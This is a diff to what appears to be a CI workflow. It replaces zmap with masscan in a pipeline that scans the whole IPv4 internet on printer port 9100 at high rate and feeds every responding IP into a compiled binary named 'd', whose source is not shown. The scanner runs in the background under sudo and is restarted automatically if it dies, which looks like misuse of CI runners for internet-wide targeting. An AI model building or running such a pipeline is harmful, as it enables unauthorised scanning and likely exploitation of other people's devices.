@@ -28,7 +28,7 @@ jobs:
       - name: 🔌 Install deps
         run: |
           sudo apt update -qq
-          sudo apt install -y -qq zmap golang-go
+          sudo apt install -y -qq masscan golang-go
 
       - name: ⬇️ Fetch and compile d.go
         run: |
@@ -42,16 +42,16 @@ jobs:
           
           echo "✅ d binary ready"
 
-      - name: 🚀 Start zmap scanner in background
+      - name: 🚀 Start masscan scanner in background
         run: |
-          echo "🚀 Starting zmap → d pipeline..."
+          echo "🚀 Starting masscan → d pipeline..."
           
-          # zmap needs sudo for raw sockets
-          nohup sudo bash -c 'zmap -p 9100 -B 800M 0.0.0.0/0 | ./d' > scanner.log 2>&1 &
+          # masscan needs sudo for raw sockets
+          # grep extracts just the IP so it pipes cleanly into d
+          nohup sudo bash -c 'masscan -p 9100 --rate 100000 0.0.0.0/0 | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | ./d' > scanner.log 2>&1 &
           echo $! > scanner.pid
           echo "✅ Scanner started (PID: $(cat scanner.pid))"
           sleep 5
-          # print the first 20 lines of the log to see if it started or crashed immediately
           echo "--- Initial Scanner Log ---"
           head -n 20 scanner.log
           echo "---------------------------"
@@ -68,7 +68,7 @@ jobs:
               echo "⚠️ Scanner died at $(date). Restarting..."
               cat scanner.log
               > scanner.log
-              nohup sudo bash -c 'zmap -p 9100 -B 800M 0.0.0.0/0 | ./d' > scanner.log 2>&1 &
+              nohup sudo bash -c 'masscan -p 9100 --rate 100000 0.0.0.0/0 | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | ./d' > scanner.log 2>&1 &
               echo $! > scanner.pid
             fi
             
